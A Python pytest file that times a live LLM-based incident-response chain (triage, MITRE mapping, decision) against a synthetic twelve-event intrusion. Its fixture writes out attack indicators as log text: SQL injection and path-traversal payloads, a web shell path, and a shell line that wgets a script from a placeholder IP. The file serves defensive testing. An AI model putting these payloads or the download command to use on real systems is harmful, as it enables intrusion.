"""Live timing test: a realistic multi-event incident through triage -> mitre -> decision
against the REAL Ollama endpoint, then the deterministic gate.

Skipped by default (the normal suite stays offline and fast). Run with:

    RUN_LIVE_LLM=1 python3 -m pytest ai_engine/tests/test_live_timing.py -s -q

The chain is run twice: run 1 is a cold start (model load included unless the model is
already resident); run 2 is warm. Per-agent wall-clock time is printed in full.
"""

import logging
import os
import time

import pytest

from ai_engine.agents import base
from ai_engine.agents.decision_agent import run_decision_agent
from ai_engine.agents.mitre_agent import run_mitre_agent
from ai_engine.agents.triage_agent import run_triage_agent
from ai_engine.config.loader import get_agent_config
from ai_engine.gate.scoring import apply_gate
from ai_engine.gate.validator import validate_incident_state
from ai_engine.tests.helpers import make_event, make_incident

pytestmark = pytest.mark.skipif(
    os.environ.get("RUN_LIVE_LLM") != "1", reason="live LLM test; set RUN_LIVE_LLM=1 to run"
)

ATTACKER = "198.51.100.44"
ASSET = "prod-web-server"


def realistic_incident_events():
    """12 correlated events, 4 attack phases, 3 telemetry sources (same key -> one incident)."""
    spec = [
        (0, "flowlog", 3, "port scan: 214 distinct ports probed in 20s"),
        (8, "wazuh", 5, "sshd: 14 failed password attempts for invalid user admin"),
        (15, "waf", 9, "AWS WAF blocked request: SQL injection payload in /login?user=admin' OR 1=1--"),
        (16, "waf", 9, "AWS WAF blocked request: SQL injection UNION SELECT in /search?q="),
        (19, "waf", 8, "AWS WAF blocked request: path traversal ../../etc/passwd in /download"),
        (24, "wazuh", 8, "web shell file created: /var/www/html/uploads/cmd.php"),
        (27, "wazuh", 9, "process spawned by apache2: /bin/sh -c 'wget http://203.0.113.9/x.sh'"),
        (31, "flowlog", 7, "outbound connection to 203.0.113.9:443 from web tier (first seen)"),
        (38, "flowlog", 8, "periodic outbound beacon every 30s to 203.0.113.9:443 (4 connections)"),
        (45, "wazuh", 7, "new cron entry added for user www-data"),
        (52, "flowlog", 8, "internal connection attempt web tier -> db tier 10.0.2.15:5432 (denied)"),
        (58, "wazuh", 6, "repeated sudo failure for user www-data"),
    ]
    return [
        make_event(f"evt-{100 + i}", offset, ip=ATTACKER, asset=ASSET, source=src, severity=sev, indicator=text)
        for i, (offset, src, sev, text) in enumerate(spec)
    ]


def timed(fn, *args):
    start = time.perf_counter()
    out = fn(*args)
    return out, time.perf_counter() - start


def run_chain_once(events):
    state = make_incident(events, asset=ASSET, ip=ATTACKER)
    times = {}
    state.triage, times["triage"] = timed(run_triage_agent, events)
    state.mitre, times["mitre"] = timed(
        run_mitre_agent, state.triage.timeline if state.triage else [], events
    )
    state.decision, times["decision"] = timed(run_decision_agent, state.triage, state.mitre)
    validate_incident_state(state)
    apply_gate(state)
    times["total"] = times["triage"] + times["mitre"] + times["decision"]
    return state, times


def test_full_chain_wall_clock_vs_timeout(tmp_path, monkeypatch, capsys):
    monkeypatch.setenv("AI_ENGINE_AUDIT_LOG", str(tmp_path / "audit.log"))
    monkeypatch.setattr(base, "_audit_logger", None)
    logging.getLogger("ai_engine.audit").handlers.clear()

    events = realistic_incident_events()
    payload_chars = len(base.format_events_for_prompt(events))
    timeout = get_agent_config("triage_agent").timeout_seconds
    assert payload_chars <= base.MAX_PAYLOAD_CHARS, "test incident must fit the payload cap"

    report = [f"events={len(events)} triage_payload_chars={payload_chars} "
              f"cap={base.MAX_PAYLOAD_CHARS} per_call_timeout={timeout}s"]
    results = {}
    for label in ("run1_cold_or_as_found", "run2_warm"):
        state, times = run_chain_once(events)
        results[label] = (state, times)
        report.append(
            f"{label}: triage={times['triage']:.2f}s mitre={times['mitre']:.2f}s "
            f"decision={times['decision']:.2f}s TOTAL={times['total']:.2f}s | "
            f"stages_ok={[state.triage is not None, state.mitre is not None, state.decision is not None]} "
            f"validation_errors={len(state.validation_errors)} risk_score={state.risk_score} "
            f"final_decision={state.final_decision}"
        )
    slowest = max(max(t["triage"], t["mitre"], t["decision"]) for _, t in results.values())
    report.append(f"slowest_single_call={slowest:.2f}s margin_vs_timeout={timeout - slowest:.2f}s "
                  f"({slowest / timeout * 100:.1f}% of timeout used)")
    with capsys.disabled():
        print("\nLIVE TIMING REPORT\n" + "\n".join(report))

    # A failed stage is a real finding, not a pass: the caller would escalate.
    for label, (state, _) in results.items():
        assert state.triage is not None and state.mitre is not None and state.decision is not None, label
